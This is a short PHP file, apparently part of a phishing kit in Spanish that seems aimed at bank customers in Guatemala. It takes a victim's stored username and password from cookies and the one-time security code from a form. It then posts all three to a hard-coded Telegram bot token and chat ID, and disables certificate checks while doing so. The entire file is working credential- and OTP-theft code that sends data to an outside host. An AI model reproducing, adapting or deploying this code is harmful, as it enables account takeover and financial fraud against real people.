<?php 
require('../panel/lib/funciones.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_COOKIE['contrasena'];
$registro = $_COOKIE['registro'];

$cdinamica = $_POST['otp'];

setcookie('cdinamica',$cdinamica,time()+60*9);



$res = preg_replace('/[\/\.\;\-" "]+/', ' ', $fecha_nacimiento);
$res2 = preg_replace('/[\/\.\;\-" "]+/', ' ', $fecha);
$res3  = preg_replace('/[\@\.\;\-" "]+/', ' ', $email);
 
$string = "Usuario agrego dinamica datos: $usuario \n PASS $contrasena \n Clave Dinamica: $cdinamica";
ini_set('display_errors', 1);

ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
date_default_timezone_set('America/Guatemala');
   $token = "5815438810:AAFAofBaWB4zjUKnFq1YiCtOdYKtH-GmMwo";

    $datos = [
        'chat_id' => '-1001531231814',
    'text' => $string,
    'parse_mode' => 'MarkdownV2' #formato del mensaje
];
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$r_array = json_decode(curl_exec($ch), true);

curl_close($ch);

actualizar_registro_otp($registro,$cdinamica);
?>